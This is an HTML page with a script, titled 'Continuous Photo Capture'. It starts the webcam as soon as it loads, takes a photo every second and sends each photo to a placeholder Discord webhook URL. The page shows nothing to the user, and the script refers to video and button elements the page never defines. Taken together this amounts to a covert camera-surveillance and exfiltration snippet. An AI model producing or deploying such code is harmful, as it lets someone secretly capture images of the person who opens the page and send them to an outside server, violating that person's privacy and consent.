<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Continuous Photo Capture</title>
    <style>
        /* Your CSS styles here */
    </style>
</head>
<body>
    <div id="container">
        <!-- Your HTML content here -->
    </div>

    <script>
        const video = document.getElementById('video');
        let stream;
        let imageCapture;
        let intervalId;

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
                document.getElementById('captureButton').removeAttribute('disabled');
                intervalId = setInterval(captureAndSendPhoto, 1000);
            } catch (err) {
                console.error('Error accessing camera:', err);
            }
        }

        startCamera();

        document.getElementById('captureButton').addEventListener('click', captureAndSendPhoto);

        async function captureAndSendPhoto() {
            try {
                const photoBlob = await imageCapture.takePhoto();
                sendPhotoToDiscord(photoBlob);
            } catch (err) {
                console.error('Error capturing photo:', err);
            }
        }

        function sendPhotoToDiscord(photoBlob) {
            const webhookUrl = 'https://discord.com/api/webhooks/your-webhook-url';

            const formData = new FormData();
            formData.append('file', photoBlob, 'photo.jpg');

            fetch(webhookUrl, {
                method: 'POST',
                body: formData,
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                console.log('Photo sent to Discord:', data);
            })
            .catch(error => {
                console.error('Error sending photo to Discord:', error);
            });
        }
    </script>
</body>
</html>
